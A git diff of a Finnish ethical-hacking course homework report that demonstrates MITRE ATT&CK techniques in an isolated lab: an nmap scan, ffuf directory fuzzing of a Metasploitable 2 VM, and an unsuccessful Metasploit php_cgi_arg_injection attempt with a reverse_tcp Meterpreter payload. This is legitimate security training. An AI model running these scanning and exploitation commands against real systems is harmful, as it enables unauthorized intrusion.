@@ -90,7 +90,14 @@ Toimii!
 
 Virhe johtui siis vähäisestä muistista. Aiemmin testatessa minulla oli muistia 20 gigaa, mutta siivosin konetta ja nostin sitä 40:een ja tämä oli tarpeeksi virtuaalikoneen pyörittämiseen. 
 
+Valitsin Host-Only verkkovaihtoehdon, jolloin kone ei ole yhteydessä internettiin, mutta samasssa verkossa hyökkäyskoneen kanssa.
+
+<img src="/images/ping10.png" alt="" title="" width="70%" height="70%">
+<img src="/images/ping11.png" alt="" title="" width="70%" height="70%">
+
 ## b) Trustme.lnk. Kokeile PhishSticksin [revshell](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/revshell) vihamielistä tiedostoa, joka avaa käänteisen shellin hyökkääjän koneelle. Selitä, mitä tapahtuu ja miksi. Testaa, että pysyt antamaan kohdekoneelle komentoja reverse shellin kautta.
+
+
 
 
 ## d) PageRank. Laita [linkki raporttiisi kurssisivun kommentiksi](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#comments).
@@ -102,10 +109,135 @@ Virhe johtui siis vähäisestä muistista. Aiemmin testatessa minulla oli muisti
 - Hyväksyn kommentit käsin, ne tulevat siis näkyviin viiveellä.
 
 
-## c) Attaaack! MITRE Attack Enterprise Matrix: Demonstroi viisi tekniikkaa viidestä eri taktiikasta.
+## c) Attaaack! [MITRE Attack Enterprise Matrix](https://attack.mitre.org/): Demonstroi viisi tekniikkaa viidestä eri taktiikasta.
 - Tekniikkaa tulee kokeilla käytännössä, kuvailu ei riitä.
 - Asenna tarvittaessa omat harjoitusmaalit. Eristä tarvittaessa koneet Internetistä harjoittelun ajaksi.
 - Voit käyttää kurssilla jo opeteltuja työkaluja (helpompaa) tai kokeilla uusia. Aiemminkin käytetyistä tekniikoista pitää tehdä uusi demonstraatio tässä tehtävässä.
   - Mikäli haluat tehtävästä helpon version, tekniikoiden valinta auttaa. Tuolta löytyy myös tuttuja ja helppoja tekniikoita.
 - Selitä, mitä esimerkissä tapahtuu.
 - Nimeä käytetyt taktiikat, tekniikat ja alitekniikat. Merkitse myös numerot T0123.456.
+
+
+
+
+### 1. Reconnaissance/TA0043 - Active Scanning/T1595
+
+Aktiivisessa tiedustelussa kerätäkseen tietoa, jota voidaan käyttää kohteen kartoittamisessa. Aktiivisilla tiedusteluilla tarkoitetaan toimia, joissa hyökkääjä tutkii esimerkiski uhrin verkkoinfrastruktuuria tai palveluita. Yksi työkalu avoimien porttien skannaamiseen on kurssilla aikaisemmin käytetty Nmap, jota aion käyttää testissäni.
+
+Ennen testiä tarkistin, ettei kone yllä internettiin. Sen jälkeen laitoin Apache-palvelimen pystyyn, jotta saisimme edes jonkinlaisia tuloksia porttiskannauksesta.
+
+    sudo systemctl start apache2
+
+Nyt tiedetään, että portti 80 pitäisi olla ainakin auki. Tehdään porttiskannaus omaan koneeseen:
+
+    sudo nmap -A localhost  
+
+Tulokset:
+
+``````
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-02 23:50 EET
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000086s latency).
+Other addresses for localhost (not scanned): ::1
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+OS details: Linux 2.6.32
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
+``````
+
+Skannauksesta näemme, että portti 80 auki ja siellä on apache-palvelin pystyssä. <code>-A</code> viittaa agressiiviseen skannaukseen, ja tämä paljastaa mm. palvelimen käyttöjärjestelmän ja se version. Tätä tietoa voi hyödyntää exploitien käyttämisessä.
+
+
+### 2. Discovery/TA0043 - File and Directory Discovery/T1083
+
+Tiedosto- ja hakemistotiedustelu: Hyökkääjä voi etsiä tiedostoja ja hakemistoja tai tiettyjä tietoja tiedostojärjestelmästä.
+
+Tässä testissä käytän aikaisemmin kurssilla käytettyä ffuf- työkalua. Kohteeni on Metasploitable 2.
+
+    ./ffuf -w common.txt -u http://192.168.12.3/FUZZ
+
+- <code>./ffuf</code>: sovellus
+- <code>-w common.txt</code>: käyetään sanalistaa "common.txt"
+- <code>[-u http://192.168.12.3](http://192.168.12.3/FUZZ)</code>: kohdeosoite ja "FUZZ"- kohtaan fuzzataan.
+
+Tulokset:
+
+`````
+[Status: 403, Size: 289, Words: 22, Lines: 11, Duration: 11ms]
+    * FUZZ: .hta
+
+[Status: 403, Size: 294, Words: 22, Lines: 11, Duration: 14ms]
+    * FUZZ: .htaccess
+
+[Status: 403, Size: 293, Words: 22, Lines: 11, Duration: 27ms]
+    * FUZZ: cgi-bin/
+
+[Status: 301, Size: 315, Words: 21, Lines: 10, Duration: 11ms]
+    * FUZZ: dav
+
+[Status: 403, Size: 294, Words: 22, Lines: 11, Duration: 2703ms]
+    * FUZZ: .htpasswd
+
+[Status: 200, Size: 891, Words: 237, Lines: 30, Duration: 158ms]
+    * FUZZ: index.php
+
+[Status: 200, Size: 891, Words: 237, Lines: 30, Duration: 366ms]
+    * FUZZ: index
+
+[Status: 301, Size: 322, Words: 21, Lines: 10, Duration: 9ms]
+    * FUZZ: phpMyAdmin
+
+[Status: 200, Size: 48029, Words: 2409, Lines: 657, Duration: 275ms]
+    * FUZZ: phpinfo.php
+
+...( jatkuu )...
+`````
+
+
+### X. Discovery/TA0043 - File and Directory Discovery/T1083
+
+Aikaisemmasta fuzzauksesta löysimme <code>/phpinfo.php</code> hakemiston, josta löytyy tietoa palvelimesta.
+
+<img src="/images/php5.png" alt="" title="" width="70%" height="70%">
+
+Avataan metasploit framework console <code>msfconsole</code> ja etsitään sopiva exploit. Käytin tässä apuna [How To Hack and Exploit Port 80 HTTP Metasploitable 2 Full Walkthrough - Home Hacking Lab Video 11](https://www.youtube.com/watch?v=HH7DPfYTfoI) -videota.
+
+``````
+msf6 > search php_cgi
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank       Check  Description
+   -  ----                                      ---------------  ----       -----  -----------
+   0  exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  Yes    PHP CGI Argument Injection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/php_cgi_arg_injection
+``````
+Exploitti löytyi joten käytetään sitä. 
+
+`````
+msf6 exploit(multi/http/php_cgi_arg_injection) > use 0
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/php_cgi_arg_injection) > set rhosts 192.168.12.3
+rhosts => 192.168.12.3
+msf6 exploit(multi/http/php_cgi_arg_injection) > exploit
+
+[*] Started reverse TCP handler on 192.168.12.2:4444 
+[*] Exploit completed, but no session was created.
+
+``````
+
+Jostain syystä sain virheilmoituksen, että sessiota ei luotu. Syy tuntematon. Videossa kuitenkin yhteys saadaan luotua ja päästää koneeseen käsiksi.
+
